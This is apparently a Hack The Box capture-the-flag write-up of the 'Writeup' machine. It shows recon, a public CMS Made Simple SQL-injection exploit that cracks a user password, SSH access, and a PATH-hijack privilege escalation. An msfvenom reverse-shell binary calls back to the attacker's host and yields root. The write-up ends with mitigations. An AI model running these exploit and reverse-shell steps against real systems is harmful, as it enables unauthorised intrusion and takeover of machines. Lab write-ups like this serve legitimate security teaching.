# Writeup

```
kali@kali:~/htb/Writeup$ sudo nmap -p- -sV -sC 10.129.1.195
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 00:23 EST
Nmap scan report for 10.129.1.195
Host is up (0.027s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.08 seconds
kali@kali:~/htb/Writeup$ 

```

going to robots gives this:

```
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
```

I check on /writeup/ and find it's sort of a home-page.

I inspect the source code and see that is is made with "CMS Made Simple"

```
kali@kali:~/htb/Writeup$ searchsploit CMS Made Simple
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                        | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                                   | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                                   | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                                | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                                    | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                   | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                         | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                                                               | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                      | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                          | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                                                              | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                                             | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                       | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                          | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                          | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                             | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                   | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection                                            | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                          | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                                             | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                            | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                              | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                  | php/webapps/48851.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                             | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                             | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                                           | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                                                  | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                          | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                     | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                            | php/webapps/46546.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I also find out that http://10.129.1.195/writeup/admin is a valid URL. And it spawns a pop-up login-box.

So we have a lot of possible choices here.

I look at the URL of the different pages: `http://10.129.1.195/writeup/index.php?page=writeup`

Maybe some LFI here? Nothing works.

I also google and the CMS Made Simple < 2.2.10 - SQL Injection is the first thing that pops up.



I download the exploit and run it after looking through it:

```
kali@kali:~/htb/Writeup$ python 46635.py -u http://10.129.1.195/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9

```

Awesome. 

The creds do not work on the webpage. So I try ssh:

```
kali@kali:~/htb/Writeup$ ssh jkr@10.129.1.195
jkr@10.129.1.195's password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
/usr/bin/xauth:  file /home/jkr/.Xauthority does not exist
jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
jkr@writeup:~$ sudo -l
-bash: sudo: command not found
jkr@writeup:~$ 
```

I did not find anything in the users home folder, nor anything in the /var/www/html folder. And there were no clearly suspicious folders lying around.

So I created a procmon shell-script using vi:

```
jkr@writeup:/tmp$ cat proc.sh 
#!/bin/bash

old_process=$(ps -eo command)

while true; do
        new_process=$(ps -eo command)
        diff<(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|ps|command"
        old_process=$new_process

done

jkr@writeup:/tmp$ ./proc.sh
> /usr/sbin/cron
> /usr/sbin/CRON
> /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1
> /usr/bin/perl /root/bin/cleanup.pl
< /usr/sbin/cron
< /usr/sbin/CRON
< /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1
< /usr/bin/perl /root/bin/cleanup.pl
> [proc.sh] <defunct>
< [proc.sh] <defunct>
> /bin/sh /sbin/dhclient-script
> /bin/sh /sbin/dhclient-script
< /bin/sh /sbin/dhclient-script
< /bin/sh /sbin/dhclient-script
> [proc.sh] <defunct>
< [proc.sh] <defunct>
> [proc.sh] <defunct>
< [proc.sh] <defunct>
^C
jkr@writeup:/tmp$ 

```

So what does the cleanup script clean? I have no idea.

I set up a simplehttp python webserver and download Linenum.sh to the target machine

```
jkr@writeup:~$ wget 10.10.14.60:8000/LinEnum.sh
--2021-03-04 01:46:07--  http://10.10.14.60:8000/LinEnum.sh
Connecting to 10.10.14.60:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                             100%[============================================================================>]  45.54K  --.-KB/s    in 0.05s   

2021-03-04 01:46:07 (885 KB/s) - ‘LinEnum.sh’ saved [46631/46631]

jkr@writeup:~$ chmod 777 LinEnum.sh
jkr@writeup:~$ ./LinEnum.sh > enum
jkr@writeup:~$ more enum

```


I see that /usr/local/bin belongs to the staff group here.


```
[-] Path information:
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
drwxr-xr-x 2 root root   4096 Apr 19  2019 /bin
drwxr-xr-x 2 root root  20480 Aug 23  2019 /usr/bin
drwxr-xr-x 2 root root   4096 Jun  3  2018 /usr/games
drwx-wsr-x 2 root staff 20480 Apr 19  2019 /usr/local/bin
drwxrwsr-x 2 root staff  4096 Apr 19  2019 /usr/local/games
```

And also that 

`PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games`

This is in the PATH. So if I have write access here, This will be the default place the system will run commands.

So I have to find something that is ran without the full path, as it will default to the /usr/local/bin path.

I download pspy32 and look for recurring processes and find logger, mv, run-parts after running it for a while.

logger seems to be connected to mysql, mv is moving /etc&resolv.conf.dhclient

and run-parts is also connected to dhclient.


`02:11:32 CMD: UID=0    PID=16114  | run-parts --list /etc/dhcp/dhclient-enter-hooks.d`

`02:16:24 CMD: UID=0    PID=16144  | run-parts --list /etc/dhcp/dhclient-exit-hooks.d` 


It seems like this is being ran approximately every 5 minutes. But in addition we have the cleanup script being ran every minute.

So I quickly create a reverse shell:

```
kali@kali:~/htb/Writeup$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.60 LPORT=1337 -f elf -o run-parts
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: run-parts
kali@kali:~/htb/Writeup$ 
```

And prepare to send it over to the machine with scp:


```
kali@kali:~/htb/Writeup$ sudo scp run-parts jkr@10.129.1.195:/usr/local/bin/run-parts
The authenticity of host '10.129.1.195 (10.129.1.195)' can't be established.
ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.1.195' (ECDSA) to the list of known hosts.
jkr@10.129.1.195's password: 
run-parts                                                                                                                 100%  194     7.3KB/s   00:00    
kali@kali:~/htb/Writeup$ sudo scp run-parts jkr@10.129.1.195:/usr/local/bin/run-parts
jkr@10.129.1.195's password: 
```

And I noticed on my pspy monitor that run-parts is called when an ssh connection is made as well. 

```
kali@kali:~/htb/Writeup$ sudo nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.1.195 43980
whoami
root
```


## Comparing myself to the official writeup:

They used a tool called wappalyzer to analyze the webpage and enumerate CMS.

They then find the sql injection poc, and crack the password:salt with hashcat.

They enumerate recently edited files with `cd /etc` `ls -lt`, and find update-motd.d and find a file called 10-uname, which is a sh file. That runs uname -rnsom

They use pspy to check whether it is called when a user logs in.

They confirm that the file 10-uname was accessed. They then use `find / -group staff 2>/dev/null` to find files and folders owned by the group "staff".

This reveals /usr/local/bin.

They then find that it is the first entry in the PATH.

They then place a reverse shell in /usr/local/bin called uname.

This means that when a user logs in via ssh, 10-uname will be called, which will then run uname. This will be ran from /usr/local/bin as the PATH dictates.



## How to stop this exploit:

Updating CMS should fix the SQL injection issue.

There are a couple of ways to fix the privilege escalation. The first is to limit the permissions of user jkr or group staff.

The other is to make sure to use fixed paths for all commands. eg. /usr/bin/run-parts or /usr/bin/uname instead of relying on PATH.




